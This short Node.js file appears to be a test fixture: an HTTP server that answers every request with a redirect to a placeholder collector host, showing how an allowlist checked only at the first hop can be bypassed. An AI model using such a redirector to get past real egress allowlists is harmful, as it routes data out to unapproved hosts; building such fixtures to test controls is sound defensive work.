// An allowlisted host that answers with a redirect to a host nobody allowlisted. A network-layer
// control cannot be tricked by a redirect, because a redirect cannot create a route that does not
// exist; an application-layer allowlist checked once at the first hop can be.
import http from "node:http";

const port = Number(process.argv[2] ?? 9200);
const target = process.argv[3] ?? "http://evil-collector.example.com/collect";

http.createServer((req, res) => {
  res.writeHead(302, { location: target, "content-type": "text/plain" });
  res.end("go here instead\n");
}).listen(port, "0.0.0.0", () => console.log("redirector ready on " + port));
